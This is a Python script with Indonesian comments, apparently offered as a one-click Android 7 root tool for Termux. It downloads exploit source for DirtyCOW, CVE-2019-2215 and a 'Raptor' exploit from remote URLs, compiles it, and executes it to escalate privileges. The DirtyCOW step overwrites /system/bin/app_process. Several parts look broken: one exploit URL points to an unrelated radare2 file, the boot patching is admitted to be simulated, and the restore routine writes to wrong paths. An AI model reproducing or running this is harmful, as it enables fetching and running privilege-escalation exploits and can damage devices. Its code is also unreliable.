#!/usr/bin/env python3
"""
TERMUX SUPER ROOT - Android 7 Root Suite
Advanced Python Root Tool untuk Termux
Support: Vivo 1612 & Android 7.x
"""

import os
import sys
import subprocess
import time
import requests
import zipfile
import tarfile
import hashlib
import json
from pathlib import Path

class TermuxSuperRoot:
    def __init__(self):
        self.termux_home = "/data/data/com.termux/files/home"
        self.work_dir = f"{self.termux_home}/.super_root"
        self.magisk_dir = f"{self.work_dir}/magisk"
        self.exploit_dir = f"{self.work_dir}/exploits"
        self.backup_dir = f"{self.work_dir}/backup"
        
        self.setup_directories()
        self.detect_device()
        
    def setup_directories(self):
        """Setup working directories"""
        os.makedirs(self.work_dir, exist_ok=True)
        os.makedirs(self.magisk_dir, exist_ok=True)
        os.makedirs(self.exploit_dir, exist_ok=True)
        os.makedirs(self.backup_dir, exist_ok=True)
        
        print("🔧 [TERMUX SUPER ROOT]")
        print("⚡ Advanced Python Root Suite for Android 7")
        print(f"📁 Work Directory: {self.work_dir}")
        
    def detect_device(self):
        """Detect device information"""
        print("\n[📱] Device Detection...")
        
        self.device_info = {
            'brand': self.get_prop('ro.product.brand'),
            'model': self.get_prop('ro.product.model'),
            'device': self.get_prop('ro.product.device'),
            'android_version': self.get_prop('ro.build.version.release'),
            'security_patch': self.get_prop('ro.build.version.security_patch'),
            'kernel': self.get_prop('ro.kernel.version'),
            'architecture': self.get_prop('ro.product.cpu.abi')
        }
        
        for key, value in self.device_info.items():
            print(f"   {key}: {value}")
            
        return self.device_info
    
    def get_prop(self, prop_name):
        """Get system property"""
        try:
            result = subprocess.run(
                ['getprop', prop_name],
                capture_output=True,
                text=True
            )
            return result.stdout.strip()
        except:
            return "Unknown"
    
    def download_tool(self, url, filename):
        """Download tool dari internet"""
        filepath = os.path.join(self.exploit_dir, filename)
        
        if os.path.exists(filepath):
            print(f"   ✅ {filename} already exists")
            return filepath
            
        print(f"   📥 Downloading {filename}...")
        try:
            response = requests.get(url, stream=True)
            with open(filepath, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print(f"   ✅ Downloaded: {filename}")
            return filepath
        except Exception as e:
            print(f"   ❌ Download failed: {e}")
            return None
    
    def install_termux_dependencies(self):
        """Install dependencies di Termux"""
        print("\n[📦] Installing Termux Dependencies...")
        
        packages = [
            'python', 'clang', 'make', 'binutils',
            'wget', 'curl', 'git', 'openssl-tool'
        ]
        
        for pkg in packages:
            print(f"   Installing {pkg}...")
            subprocess.run(['pkg', 'install', '-y', pkg], capture_output=True)
    
    def compile_exploits(self):
        """Compile semua exploit dari source"""
        print("\n[🔨] Compiling Exploits...")
        
        exploits_to_compile = {
            'dirtycow': {
                'source': 'https://github.com/timwr/CVE-2016-5195/raw/master/dirtycow.c',
                'binary': 'dirtycow',
                'flags': '-pie -fPIC'
            },
            'cve-2019-2215': {
                'source': 'https://raw.githubusercontent.com/guardian/cve-2019-2215/main/exploit.c',
                'binary': 'binder_exploit', 
                'flags': '-static'
            },
            'raptor': {
                'source': 'https://raw.githubusercontent.com/raptor/radare2/master/shlr/spp/raptor.c',
                'binary': 'raptor',
                'flags': '-ldl'
            }
        }
        
        for name, info in exploits_to_compile.items():
            source_path = self.download_tool(info['source'], f"{name}.c")
            if source_path:
                binary_path = os.path.join(self.exploit_dir, info['binary'])
                compile_cmd = f"clang {info['flags']} {source_path} -o {binary_path}"
                
                print(f"   Compiling {name}...")
                result = subprocess.run(compile_cmd, shell=True, capture_output=True)
                
                if result.returncode == 0 and os.path.exists(binary_path):
                    subprocess.run(['chmod', '+x', binary_path])
                    print(f"   ✅ Compiled: {info['binary']}")
                else:
                    print(f"   ❌ Compile failed: {name}")
    
    def setup_magisk(self):
        """Setup Magisk di Termux"""
        print("\n[🎭] Setting up Magisk...")
        
        # Download Magisk latest
        magisk_url = "https://github.com/topjohnwu/Magisk/releases/download/v26.4/Magisk-v26.4.apk"
        magisk_apk = self.download_tool(magisk_url, "magisk.apk")
        
        if magisk_apk:
            # Extract Magisk dari APK
            print("   Extracting Magisk from APK...")
            with zipfile.ZipFile(magisk_apk, 'r') as zip_ref:
                zip_ref.extractall(self.magisk_dir)
            
            # Cari binary magisk
            magisk_binary = None
            for root, dirs, files in os.walk(self.magisk_dir):
                for file in files:
                    if file == "magisk":
                        magisk_binary = os.path.join(root, file)
                        break
            
            if magisk_binary and os.path.exists(magisk_binary):
                subprocess.run(['chmod', '+x', magisk_binary])
                print("   ✅ Magisk setup complete")
                return magisk_binary
        
        print("   ❌ Magisk setup failed")
        return None
    
    def exploit_dirtycow(self):
        """CVE-2016-5195 DirtyCOW Exploit"""
        print("\n[🐮] Executing DirtyCOW Exploit...")
        
        dirtycow_bin = os.path.join(self.exploit_dir, "dirtycow")
        
        if not os.path.exists(dirtycow_bin):
            print("   ❌ DirtyCOW binary not found")
            return False
        
        # Backup original app_process
        print("   Backing up app_process...")
        subprocess.run(['cp', '/system/bin/app_process', f"{self.backup_dir}/app_process.backup"])
        
        # Create root payload
        root_shell = f"""#!/system/bin/sh
/system/bin/sh -i
"""
        with open(f"{self.exploit_dir}/root_shell", "w") as f:
            f.write(root_shell)
        
        subprocess.run(['chmod', '+x', f"{self.exploit_dir}/root_shell"])
        
        # Execute DirtyCOW
        print("   Running DirtyCOW exploit...")
        exploit_cmd = f"{dirtycow_bin} /system/bin/app_process {self.exploit_dir}/root_shell"
        result = subprocess.run(exploit_cmd, shell=True, capture_output=True)
        
        if result.returncode == 0:
            print("   ✅ DirtyCOW exploit executed")
            return True
        
        print("   ❌ DirtyCOW exploit failed")
        return False
    
    def exploit_binder_uaf(self):
        """CVE-2019-2215 Binder UAF Exploit"""
        print("\n[🔗] Executing Binder UAF Exploit...")
        
        binder_bin = os.path.join(self.exploit_dir, "binder_exploit")
        
        if not os.path.exists(binder_bin):
            print("   ❌ Binder exploit binary not found")
            return False
        
        # Execute binder exploit
        print("   Running Binder UAF exploit...")
        result = subprocess.run(binder_bin, capture_output=True)
        
        if result.returncode == 0:
            print("   ✅ Binder UAF exploit executed")
            return True
        
        print("   ❌ Binder UAF exploit failed")
        return False
    
    def exploit_raptor(self):
        """Raptor prctl exploit"""
        print("\n[🦅] Executing Raptor Exploit...")
        
        raptor_bin = os.path.join(self.exploit_dir, "raptor")
        
        if not os.path.exists(raptor_bin):
            print("   ❌ Raptor binary not found")
            return False
        
        # Execute raptor
        print("   Running Raptor exploit...")
        result = subprocess.run(raptor_bin, capture_output=True)
        
        if result.returncode == 0:
            print("   ✅ Raptor exploit executed")
            return True
        
        print("   ❌ Raptor exploit failed")
        return False
    
    def patch_boot_image(self):
        """Patch boot image dengan Magisk"""
        print("\n[🔧] Patching Boot Image...")
        
        # Cari boot partition
        boot_partitions = [
            "/dev/block/bootdevice/by-name/boot",
            "/dev/block/platform/mtk-msdc.0/by-name/boot", 
            "/dev/block/platform/soc/by-name/boot"
        ]
        
        boot_path = None
        for part in boot_partitions:
            if os.path.exists(part):
                boot_path = part
                break
        
        if not boot_path:
            print("   ❌ Boot partition not found")
            return False
        
        # Backup boot image
        print(f"   Backing up boot image from {boot_path}...")
        backup_cmd = f"dd if={boot_path} of={self.backup_dir}/boot.img"
        result = subprocess.run(backup_cmd, shell=True, capture_output=True)
        
        if result.returncode != 0:
            print("   ❌ Boot backup failed")
            return False
        
        # Patch dengan Magisk (simulasi)
        print("   Patching boot image with Magisk...")
        magisk_binary = self.setup_magisk()
        
        if magisk_binary:
            patch_cmd = f"{magisk_binary} --patch {self.backup_dir}/boot.img {self.backup_dir}/boot_patched.img"
            # Note: Ini butuh root access dulu, jadi kita skip dulu
            print("   ⚠️  Boot patching requires initial root (will do later)")
            return True
        
        return False
    
    def install_magisk_app(self):
        """Install Magisk Manager APK"""
        print("\n[📱] Installing Magisk Manager...")
        
        magisk_apk = os.path.join(self.exploit_dir, "magisk.apk")
        
        if os.path.exists(magisk_apk):
            # Install via termux (butuh accessibility)
            install_cmd = f"termux-open {magisk_apk}"
            subprocess.run(install_cmd, shell=True)
            print("   ✅ Magisk Manager installation triggered")
            return True
        
        print("   ❌ Magisk APK not found")
        return False
    
    def check_root(self):
        """Check if root achieved"""
        print("\n[🔍] Checking Root Access...")
        
        # Coba berbagai method check root
        checks = [
            "su -c id",
            "which su",
            "ls -la /system/bin/su", 
            "ls -la /system/xbin/su"
        ]
        
        for check in checks:
            result = subprocess.run(check, shell=True, capture_output=True)
            if result.returncode == 0:
                print("   ✅ ROOT ACCESS CONFIRMED!")
                print(f"   Command: {check}")
                print(f"   Output: {result.stdout.decode()}")
                return True
        
        print("   ❌ No root access yet")
        return False
    
    def auto_root_sequence(self):
        """Automatic root sequence"""
        print("\n" + "="*50)
        print("🚀 STARTING AUTOMATIC ROOT SEQUENCE")
        print("="*50)
        
        # Step 1: Install dependencies
        self.install_termux_dependencies()
        
        # Step 2: Compile exploits
        self.compile_exploits()
        
        # Step 3: Try exploits berurutan
        exploits = [
            ("DirtyCOW", self.exploit_dirtycow),
            ("Binder UAF", self.exploit_binder_uaf), 
            ("Raptor", self.exploit_raptor)
        ]
        
        root_achieved = False
        for name, exploit_func in exploits:
            print(f"\n💥 Trying {name}...")
            if exploit_func():
                time.sleep(2)
                if self.check_root():
                    root_achieved = True
                    break
            time.sleep(1)
        
        if root_achieved:
            # Step 4: Setup Magisk untuk persistence
            print("\n🎯 Setting up permanent root...")
            self.setup_magisk()
            self.install_magisk_app()
            
            print("\n🎉 CONGRATULATIONS! ROOT SUCCESSFUL!")
            print("📱 Magisk Manager should be installed")
            print("🔧 Permanent root established")
        else:
            print("\n😞 Root attempt failed")
            print("💡 Try running with different options")
    
    def interactive_menu(self):
        """Interactive menu untuk advanced users"""
        while True:
            print("\n" + "="*50)
            print("🔧 TERMUX SUPER ROOT - INTERACTIVE MENU")
            print("="*50)
            print("1. Auto Root Sequence")
            print("2. Compile Exploits Only") 
            print("3. Run Specific Exploit")
            print("4. Check Root Status")
            print("5. Install Magisk Manager")
            print("6. Backup System Files")
            print("7. Restore Backup")
            print("8. Device Info")
            print("9. Exit")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == '1':
                self.auto_root_sequence()
            elif choice == '2':
                self.compile_exploits()
            elif choice == '3':
                self.run_specific_exploit()
            elif choice == '4':
                self.check_root()
            elif choice == '5':
                self.install_magisk_app()
            elif choice == '6':
                self.backup_system()
            elif choice == '7':
                self.restore_backup()
            elif choice == '8':
                self.detect_device()
            elif choice == '9':
                print("👋 Exiting...")
                break
            else:
                print("❌ Invalid option")
    
    def run_specific_exploit(self):
        """Run specific exploit"""
        print("\n💣 Select Exploit to Run:")
        print("1. DirtyCOW (CVE-2016-5195)")
        print("2. Binder UAF (CVE-2019-2215)")
        print("3. Raptor")
        
        choice = input("Select exploit: ").strip()
        
        if choice == '1':
            self.exploit_dirtycow()
        elif choice == '2':
            self.exploit_binder_uaf()
        elif choice == '3':
            self.exploit_raptor()
        else:
            print("❌ Invalid choice")
    
    def backup_system(self):
        """Backup important system files"""
        print("\n💾 Backing up system files...")
        
        files_to_backup = [
            "/system/build.prop",
            "/system/bin/app_process",
            "/system/bin/sh",
            "/init.rc"
        ]
        
        for file_path in files_to_backup:
            if os.path.exists(file_path):
                file_name = os.path.basename(file_path)
                backup_cmd = f"cp {file_path} {self.backup_dir}/{file_name}.backup"
                subprocess.run(backup_cmd, shell=True)
                print(f"   ✅ Backed up: {file_name}")
    
    def restore_backup(self):
        """Restore from backup"""
        print("\n🔄 Restoring from backup...")
        
        # List backup files
        backup_files = os.listdir(self.backup_dir)
        if not backup_files:
            print("   ❌ No backup files found")
            return
        
        print("Available backups:")
        for i, file in enumerate(backup_files):
            print(f"   {i+1}. {file}")
        
        choice = input("Select backup to restore: ").strip()
        
        try:
            choice_idx = int(choice) - 1
            if 0 <= choice_idx < len(backup_files):
                backup_file = backup_files[choice_idx]
                restore_path = backup_file.replace('.backup', '')
                
                restore_cmd = f"cp {self.backup_dir}/{backup_file} /{restore_path}"
                result = subprocess.run(restore_cmd, shell=True, capture_output=True)
                
                if result.returncode == 0:
                    print(f"   ✅ Restored: {backup_file} -> /{restore_path}")
                else:
                    print(f"   ❌ Restore failed for {backup_file}")
            else:
                print("   ❌ Invalid selection")
        except ValueError:
            print("   ❌ Invalid input")

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--auto":
        root_suite = TermuxSuperRoot()
        root_suite.auto_root_sequence()
    else:
        root_suite = TermuxSuperRoot()
        root_suite.interactive_menu()

if __name__ == "__main__":
    main()
